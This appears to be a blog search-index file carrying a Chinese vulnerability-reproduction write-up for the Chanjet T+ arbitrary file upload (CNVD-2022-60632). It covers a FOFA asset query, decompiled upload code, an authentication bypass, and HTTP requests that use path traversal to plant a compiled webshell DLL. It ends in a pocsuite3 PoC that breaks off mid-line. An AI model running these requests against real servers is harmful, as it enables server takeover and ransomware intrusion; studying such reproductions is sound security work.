<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>畅捷通漏洞复现</title>
    <link href="/2023/04/13/%E7%95%85%E6%8D%B7%E9%80%9AT%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/13/%E7%95%85%E6%8D%B7%E9%80%9AT%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>畅捷通属于用友集团企业成员，畅捷通T+适用于异地多组织、多机构对企业财务汇总的管理需求；全面支持企业对远程仓库、异地办事处的管理需求；全面满足企业财务业务一体化管理需求。<br>下载：<code>https://dad.chanapp.chanjet.com/TplusYZHJ17.0.zip</code></p><h2 id="资产绘测"><a href="#资产绘测" class="headerlink" title="资产绘测"></a>资产绘测</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fofa：app=<span class="hljs-string">&quot;畅捷通-TPlus&quot;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><h3 id="畅捷通T-任意文件上传-CNVD-2022-60632-漏洞复现"><a href="#畅捷通T-任意文件上传-CNVD-2022-60632-漏洞复现" class="headerlink" title="畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现"></a>畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>2022年8月29日和8月30日，畅捷通公司紧急发布安全补丁修复了畅捷通T+软件任意文件上传漏洞。未经身份认证的攻击者利用该漏洞，通过绕过系统鉴权，在特定配置环境下实现任意文件的上传，从而执行任意代码，获得服务器控制权限。目前，已有用户被不法分子利用该漏洞进行勒索病毒攻击的情况出现。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>畅捷通T+单机版&lt;&#x3D;17.0且使用IIS10.0以下版本</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>从其他复现文章看到存在漏洞文件在<code>/SM/SetupAccount/upload.aspx</code>文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686555876557-51e5b973-d632-4e22-8331-389e2d3a274c.png#averageHue=%23faf7f6&clientId=ue694f278-f372-4&from=paste&height=677&id=u3c5b8dbf&originHeight=1016&originWidth=1133&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=135865&status=done&style=none&taskId=ua41e724c-d72d-438d-9aed-5d8eb50d30e&title=&width=755.3333333333334" alt="image.png"><br>可以看到这是预编译后的文件，无法正常打开，需要使用反编译软件<code>dsSpy</code>来打开。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686555940659-f3c6bbfc-1d82-4bda-a4ad-12420421d0fa.png#averageHue=%23fbfbfb&clientId=ue694f278-f372-4&from=paste&height=235&id=u3924255b&originHeight=353&originWidth=1221&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16128&status=done&style=none&taskId=u0aab8e90-d7f8-4473-b1c6-e840376739e&title=&width=814" alt="image.png"><br>首先来带<code>/bin</code>目录下需按照<code>upload.aspx</code>对应的<code>compiled</code>文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686556873828-4baf9d75-babd-4181-a8e3-c94c6a4a4906.png#averageHue=%23363f49&clientId=ue694f278-f372-4&from=paste&height=460&id=u0d0a019e&originHeight=690&originWidth=1246&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=174268&status=done&style=none&taskId=uaa6371a5-9018-4dc5-8d83-f9a53190957&title=&width=830.6666666666666" alt="image.png"><br>得到对应的值：<code>App_Web_uploadimages.aspx.9475d17f</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686556914138-a0a2044d-4e3b-490e-9865-478cc2d88a26.png#averageHue=%23373f48&clientId=ue694f278-f372-4&from=paste&height=282&id=ue5a3a276&originHeight=423&originWidth=1622&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=84644&status=done&style=none&taskId=ubd33adb7-947c-4fe2-b50e-a5fd55b1a04&title=&width=1081.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686556977688-0253df95-56c0-484e-81fd-4aaae445ba9c.png#averageHue=%23f4efed&clientId=ue694f278-f372-4&from=paste&height=301&id=u5a7ad264&originHeight=452&originWidth=1073&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=82357&status=done&style=none&taskId=u236d5112-4c9a-4b6a-9881-3b9ec12efc7&title=&width=715.3333333333334" alt="image.png"><br>使用<code>dnSpy</code>打开<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1686557194743-0c481376-a1ed-43c5-a5ac-77bce43f77a1.png#averageHue=%23201f1e&clientId=ue694f278-f372-4&from=paste&height=535&id=ue3b1b91b&originHeight=802&originWidth=1816&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=111106&status=done&style=none&taskId=u80513d0e-9e42-4362-b072-d232c94be14&title=&width=1210.6666666666667" alt="image.png"><br>整段代码可以看到是非常少的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-meta"># Page_Load是受限制符保护的函数 void不返回任何值</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Page_Load</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span><br>&#123;<br>    <span class="hljs-meta">#读取资源</span><br>    <span class="hljs-keyword">this</span>.ReadResources();<br>    <span class="hljs-meta"># 如果上传文件计数为1进入循环</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">base</span>.Request.Files.Count == <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-meta">#字符串变量为&quot;images/index.gif&quot;</span><br>        <span class="hljs-built_in">string</span> text = <span class="hljs-string">&quot;images/index.gif&quot;</span>;<br>        <span class="hljs-meta">#获取上传文件名称obj</span><br>        <span class="hljs-built_in">object</span> obj = <span class="hljs-keyword">this</span>.ViewState[<span class="hljs-string">&quot;fileName&quot;</span>];<br>        <span class="hljs-meta">#如果文件民为空，返回字符串。</span><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>)<br>        &#123;<br>            text = obj.ToString();<br>        &#125;<br>        <span class="hljs-meta">#如果文件len长度大于204800返回错误</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.File1.PostedFile.ContentLength &gt; <span class="hljs-number">204800</span>)<br>        &#123;<br>            <span class="hljs-keyword">base</span>.Response.Write(<span class="hljs-built_in">string</span>.Concat(<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[] &#123; <span class="hljs-string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>, <span class="hljs-keyword">this</span>.PhotoTooLarge, <span class="hljs-string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>, text, <span class="hljs-string">&quot;&#x27;;&lt;/script&gt;&quot;</span> &#125;));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-meta">#如果文件type不等于&quot;image/jpeg&quot;、image/bmp、image/gif、image/pjpeg就返回错误</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/bmp&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/gif&quot;</span> &amp;&amp; <span class="hljs-keyword">this</span>.File1.PostedFile.ContentType != <span class="hljs-string">&quot;image/pjpeg&quot;</span>)<br>        &#123;<br>            <span class="hljs-keyword">base</span>.Response.Write(<span class="hljs-built_in">string</span>.Concat(<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[] &#123; <span class="hljs-string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>, <span class="hljs-keyword">this</span>.PhotoTypeError, <span class="hljs-string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>, text, <span class="hljs-string">&quot;&#x27;;&lt;/script&gt;&quot;</span> &#125;));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-meta">#获取保存的文件名</span><br>        <span class="hljs-built_in">string</span> fileName = <span class="hljs-keyword">this</span>.File1.PostedFile.FileName;<br>        <span class="hljs-meta">#获取文件后缀，\\获取文件路径中最后一个反斜杠的索引位置。通过将索引位置加1,可提取文件名。</span><br>        <span class="hljs-built_in">string</span> text2 = fileName.Substring(fileName.LastIndexOf(<span class="hljs-string">&#x27;\\&#x27;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-meta">#保存文件.获得当前路径加上\\images+上加上文件名。</span><br>        <span class="hljs-keyword">this</span>.File1.PostedFile.SaveAs(<span class="hljs-keyword">base</span>.Server.MapPath(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-string">&quot;\\images\\&quot;</span> + text2);<br>        <span class="hljs-meta">#虚拟路径映射到服务器上相应的物理目录</span><br>        <span class="hljs-built_in">string</span> text3 = <span class="hljs-keyword">base</span>.Server.MapPath(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-string">&quot;\\images\\&quot;</span> + text2;<br>        <span class="hljs-meta">#ViewState读写文件目录到images\文件名</span><br>        <span class="hljs-keyword">this</span>.ViewState[<span class="hljs-string">&quot;fileName&quot;</span>] = <span class="hljs-string">&quot;images/&quot;</span> + text2;<br>        <span class="hljs-meta">#服务器对应目录</span><br>        <span class="hljs-keyword">this</span>.Session[<span class="hljs-string">&quot;ImageName&quot;</span>] = text3;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问该文件，提示未登录，寻找权限校验文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192130692-a131d52e-f26e-434d-9377-0830624c28e9.png#averageHue=%23fcfbfb&clientId=u63cc758d-b3d7-4&from=paste&height=828&id=u66807df7&originHeight=1035&originWidth=2038&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179047&status=done&style=none&taskId=ucdfd2b7b-549a-47aa-81a8-e5e78633798&title=&width=1630.4" alt="image.png"><br>dnSpy反编译相关程序，翻看代码。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192196391-989da749-f3a4-4dd7-bb57-c08697ef8428.png#averageHue=%234990a0&clientId=u63cc758d-b3d7-4&from=paste&height=716&id=ueb795c58&originHeight=895&originWidth=919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97001&status=done&style=none&taskId=u6a09dc81-a0f9-45e5-892a-349ada50a3a&title=&width=735.2" alt="image.png"><br>找到权限验证代码出，测试一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192257032-e823cc4a-667b-4321-bc4e-ae58f99b1e8b.png#averageHue=%236f8755&clientId=u63cc758d-b3d7-4&from=paste&height=991&id=u42a828c9&originHeight=1239&originWidth=2559&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=360768&status=done&style=none&taskId=u7a231577-3bd2-47ec-8027-c62f1639e85&title=&width=2047.2" alt="image.png"><br>成功绕过登录。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692192273126-c0425982-ed41-4d61-8ca8-620476a15d77.png#averageHue=%23fcfcfc&clientId=u63cc758d-b3d7-4&from=paste&height=837&id=ue881379c&originHeight=1046&originWidth=2136&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=196219&status=done&style=none&taskId=u890ac680-32af-4260-b28f-1f7ab103030&title=&width=1708.8" alt="image.png"><br>尝试上传文件。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/SM/SetupAccount/Upload.aspx?preload=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">92.0</span><span class="hljs-number">.4515</span><span class="hljs-number">.159</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Cookie: ASP.NET_SessionId=gvigofzulthd2v1i2q5zndtf; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1662302093; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1662302093</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="hljs-comment">Content-Length: 196</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;File1&quot;;filename=&quot;poc.txt&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;h1&gt;te2022st&lt;/h1&gt;</span><br><span class="hljs-comment">------WebKitFormBoundarywwk2ReqGTj7lNYlt--</span><br></code></pre></td></tr></table></figure><p>目录中寻找文件是否成功上传<code>TPlusStd\WebSite\SM\SetupAccount\images</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692343057604-d492c6a9-ddbf-441a-867a-7eb0ba95fc80.png#averageHue=%23faf9f8&clientId=u90732433-3ed4-4&from=paste&height=433&id=ub35852c6&originHeight=650&originWidth=914&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=86780&status=done&style=none&taskId=u5fe4432d-c81c-4bf4-a9b8-2c2ee2a7259&title=&width=609.3333333333334" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692343106753-fd8a9623-47fd-4aaa-8c3a-6b1cc0314e75.png#averageHue=%23fefefd&clientId=u90732433-3ed4-4&from=paste&height=289&id=ubcd98d8d&originHeight=433&originWidth=1312&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22230&status=done&style=none&taskId=ued618bec-9164-4e87-a282-da8ca925d37&title=&width=874.6666666666666" alt="image.png"><br>当我们上传aspx文件时，服务器报错未编译文件，尝试编译文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692343152824-a0049877-4195-43db-81d9-f7438c8b271b.png#averageHue=%23f9f3c4&clientId=u90732433-3ed4-4&from=paste&height=468&id=u6dc774e2&originHeight=702&originWidth=1837&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=172474&status=done&style=none&taskId=uffc31446-908d-4e77-8e07-710ca30e39d&title=&width=1224.6666666666667" alt="image.png"><br>此时准备一个冰蝎或哥斯拉的木马，进行编译。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">C:\Windows\Microsoft.NET\Framework\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>&gt;aspnet_compiler.exe -v / -p C:\tools C:\<span class="hljs-number">11</span> -fixednames<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692344391646-cd9d1556-ad30-4a81-b2fe-a731438f941b.png#averageHue=%23d3d3d2&clientId=u90732433-3ed4-4&from=paste&height=490&id=u6276b7c5&originHeight=735&originWidth=1937&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=67126&status=done&style=none&taskId=u67572858-0a7c-4c3d-a41c-7f1d406ed9e&title=&width=1291.3333333333333" alt="image.png"><br>本地构建一个html上传表单。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">&lt;form action=<span class="hljs-string">&quot;http://192.168.150.176:8080/tplus/sm/setupaccount/upload.aspx?preload=1&quot;</span> name=<span class="hljs-string">&quot;form1&quot;</span> id=<span class="hljs-string">&quot;form1&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;image/jpeg&quot;</span>&gt; <br>    &lt;input name=<span class="hljs-string">&quot;File1&quot;</span> type=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;File1&quot;</span>&gt; &lt;br&gt; <br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">&quot;上 传&quot;</span>&gt; <br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454609632-9194670c-c1e2-4d57-aa5c-949a9a7e1ddd.png#averageHue=%23fbfbfb&clientId=ua5f27331-d912-4&from=paste&height=868&id=uf2a17b55&originHeight=1085&originWidth=2064&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=223532&status=done&style=none&taskId=ueb1c1f08-c5c1-4f1f-ba5e-8e63416c97f&title=&width=1651.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454623172-200aea4d-54c5-4fe4-bdc5-eb431f0f7146.png#averageHue=%23fbfbfb&clientId=ua5f27331-d912-4&from=paste&height=841&id=u0c3a6ed1&originHeight=1051&originWidth=2155&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=222086&status=done&style=none&taskId=u707fd5b0-9c60-4cbb-b2a8-e4b42ad874f&title=&width=1724" alt="image.png"><br>Request</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/SM/SetupAccount/Upload.aspx?preload=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.176</span>:<span class="hljs-number">8080</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.198</span> Safari/<span class="hljs-number">537.36</span><br>Accept-Encoding: gzip, deflate<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Length: 5839</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=7139a585aa969137b0e6ad1c23dd6a4d</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">--7139a585aa969137b0e6ad1c23dd6a4d</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;File1&quot;; filename=&quot;../../../bin/App_Web_shell.aspx.cdcab7d2.dll&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MZ�</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs csharp">POST /tplus/SM/SetupAccount/Upload.aspx?preload=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.150</span><span class="hljs-number">.176</span>:<span class="hljs-number">8080</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.198</span> Safari/<span class="hljs-number">537.36</span><br>Accept-Encoding: gzip, deflate<br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Length: 501</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=f997dd0c507551811a4e900e363e8f34</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">--f997dd0c507551811a4e900e363e8f34</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;File1&quot;; filename=&quot;../../../bin/shell.aspx.cdcab7d2.compiled&quot;</span><br><span class="hljs-comment">Content-Type: image/jpeg</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">﻿&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;preserve resultType=&quot;3&quot; virtualPath=&quot;/shell.aspx&quot; hash=&quot;88eec7b1a&quot; filehash=&quot;1c19382c628a&quot; flags=&quot;110000&quot; assembly=&quot;App_Web_shell.aspx.cdcab7d2&quot; type=&quot;ASP.shell_aspx&quot;&gt;</span><br><span class="hljs-comment">    &lt;filedeps&gt;</span><br><span class="hljs-comment">        &lt;filedep name=&quot;/shell.aspx&quot; /&gt;</span><br><span class="hljs-comment">    &lt;/filedeps&gt;</span><br><span class="hljs-comment">&lt;/preserve&gt;</span><br><span class="hljs-comment">--f997dd0c507551811a4e900e363e8f34--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454663078-f969fd6d-05a7-4b89-b603-12c008ed2e52.png#averageHue=%23f6f5f4&clientId=ua5f27331-d912-4&from=paste&height=243&id=u2b728a51&originHeight=304&originWidth=1130&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48601&status=done&style=none&taskId=u864aa4f2-7359-474e-809b-97171f86089&title=&width=904" alt="image.png"><br>上传成功。注意：不能和同目录文件装名字，否则会导致失败。<br>默认访问会跳转，需要加上绕过请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454771166-143803c8-e800-4b00-bac9-84ea72b838cb.png#averageHue=%23fefefe&clientId=ua5f27331-d912-4&from=paste&height=429&id=u2d09a015&originHeight=536&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19027&status=done&style=none&taskId=u386ac71a-021b-4540-a566-22f9a10c6e4&title=&width=1371.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454780366-60c3e88b-24d4-43e7-8ec5-49dc45c3e2b5.png#averageHue=%23f4f4f3&clientId=ua5f27331-d912-4&from=paste&height=393&id=u3227a122&originHeight=491&originWidth=794&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37797&status=done&style=none&taskId=u77e4f3b5-ea65-4be4-bc27-7e7c58baba4&title=&width=635.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692454791550-a1085876-76bb-41e0-ae70-41e21712e336.png#averageHue=%23232323&clientId=ua5f27331-d912-4&from=paste&height=671&id=ude1767dd&originHeight=839&originWidth=1302&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36821&status=done&style=none&taskId=uf70f4a57-7e94-4c7b-90bf-00b426fa118&title=&width=1041.6" alt="image.png"></p><h4 id="Poc3"><a href="#Poc3" class="headerlink" title="Poc3"></a>Poc3</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1692455486652-744a8709-7d2f-46f7-a851-9d29a4b60141.png#averageHue=%23131313&clientId=u92c314b1-1944-4&from=paste&height=494&id=ub2690e70&originHeight=617&originWidth=1818&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=86432&status=done&style=none&taskId=u65acf04f-7ed7-4ef7-a584-c3ff291f63d&title=&width=1454.4" alt="image.png"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#!/usr/bin/env python3</span><br><span class="hljs-meta"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pocsuite3.<span class="hljs-function">api <span class="hljs-title">import</span> (<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">    minimum_version_required, POCBase, register_poc, requests, logger,</span></span><br><span class="hljs-params"><span class="hljs-function">    OptString, OrderedDict,</span></span><br><span class="hljs-params"><span class="hljs-function">    random_str</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span><br><span class="hljs-function">import re</span><br><span class="hljs-function"><span class="hljs-title">minimum_version_required</span>(<span class="hljs-params"><span class="hljs-string">&#x27;1.9.6&#x27;</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoPOC</span>(<span class="hljs-params">POCBase</span>):</span><br><span class="hljs-function">    vulID</span> = <span class="hljs-string">&#x27;SSV-99649&#x27;</span><br>    version = <span class="hljs-string">&#x27;1&#x27;</span><br>    author = <span class="hljs-string">&#x27;&#x27;</span><br>    vulDate = <span class="hljs-string">&#x27;2022-8-29&#x27;</span><br>    createDate = <span class="hljs-string">&#x27;2023-08-23&#x27;</span><br>    updateDate = <span class="hljs-string">&#x27;2023-08-23&#x27;</span><br>    references = []<br>    name = <span class="hljs-string">&#x27;畅捷通T+ upload (CNVD-2022-60632)&#x27;</span><br>    appPowerLink = <span class="hljs-string">&#x27;https://www.chanjetvip.com&#x27;</span><br>    appName = <span class="hljs-string">&#x27;畅捷通T+&#x27;</span><br>    appVersion = 